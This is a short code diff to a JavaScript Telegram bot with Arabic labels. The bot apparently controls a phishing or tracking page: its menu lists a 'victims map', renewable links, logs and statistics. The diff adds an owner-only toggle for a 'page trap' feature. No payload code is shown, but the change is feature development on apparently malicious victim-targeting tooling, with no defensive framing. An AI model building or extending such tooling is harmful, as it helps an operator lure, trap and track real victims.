@@ -151,7 +151,8 @@ function sendPageMain(chatId, editMsgId) {
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
     [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
     [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
-    [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}]
+    [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
+    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -1557,6 +1558,15 @@ bot.on('callback_query', async (q) => {
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
         [{text:"🔄 تجديد مرة أخرى",callback_data:"pg_renew"},{text:"🔙 رجوع",callback_data:"pg_main"}]
       ]})});
+  }
+
+  if (data === "pg_trap") {
+    if (q.from.id !== BOT_OWNER) return;
+    pageConfig.trapEnabled = !pageConfig.trapEnabled;
+    savePageConfig();
+    const st = pageConfig.trapEnabled ? "✅ مفعّل" : "🔴 معطّل";
+    bot.answerCallbackQuery(q.id, {text:`🪤 فخ الصفحة: ${st}`}).catch(()=>{});
+    return sendPageMain(chatId, q.message.message_id);
   }
 
   if (data === "pg_welcome") {
